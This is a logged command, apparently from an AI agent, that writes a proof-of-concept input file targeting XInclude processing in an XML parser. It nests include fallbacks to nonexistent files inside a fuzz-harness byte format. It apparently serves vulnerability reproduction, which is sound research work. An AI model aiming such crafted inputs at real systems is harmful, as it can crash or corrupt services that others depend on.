Running command: python3 << 'EOF'
import struct

opts = 1024 | 32768  # XML_PARSE_XINCLUDE | XML_PARSE_NOXINCNODE

main_doc = '''<doc xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="nonexistent1.xml">
    <xi:fallback>
      <xi:include href="nonexistent2.xml">
        <xi:fallback>
          <child>content</child>
        </xi:fallback>
      </xi:include>
    </xi:fallback>
  </xi:include>
</doc>'''

# Format: opts (4 bytes LE) + url + backslash + newline + content + backslash + newline
backslash = b'\\'
newline = b'\n'

data = struct.pack('<I', opts)
data += b'doc.xml' + backslash + newline
data += main_doc.encode() + backslash + newline

with open('/workspace/poc1.bin', 'wb') as f:
    f.write(data)

print(f'PoC written: {len(data)} bytes')
print(repr(data[:30]))
print([hex(b) for b in data[:20]])
EOF
